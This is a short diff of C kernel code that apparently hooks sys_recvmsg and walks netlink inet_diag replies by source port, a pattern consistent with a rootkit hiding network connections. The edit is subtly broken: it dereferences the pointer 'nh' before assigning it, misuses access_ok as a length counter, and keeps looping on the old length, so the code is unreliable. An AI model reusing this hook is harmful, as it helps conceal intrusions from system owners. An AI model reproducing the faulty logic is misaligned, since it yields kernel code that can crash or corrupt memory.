@@ -171,11 +171,15 @@ g7_recvmsg(struct pt_regs *pt_regs)
     if ((len = ret = sys_recvmsg(pt_regs)) < 0)
         return ret;
 
-    nh = (struct nlsmsghdr *)kvmalloc(len, GFP_KERNEL);
+    int bytes = 0;
+    while (access_ok(nh + bytes, 1))
+        ++bytes;
+
+    nh = (struct nlmsghdr *)kvmalloc(bytes, GFP_KERNEL);
 
     copy_from_user(nh,
         (struct nlmsghdr *)((struct user_msghdr *)pt_regs->si)->msg_iov->iov_base,
-        len);
+        bytes);
 
     while (nh && NLMSG_OK(nh, len)) {
         int src = ntohs(((struct inet_diag_msg *)NLMSG_DATA(nh))->id.idiag_sport);
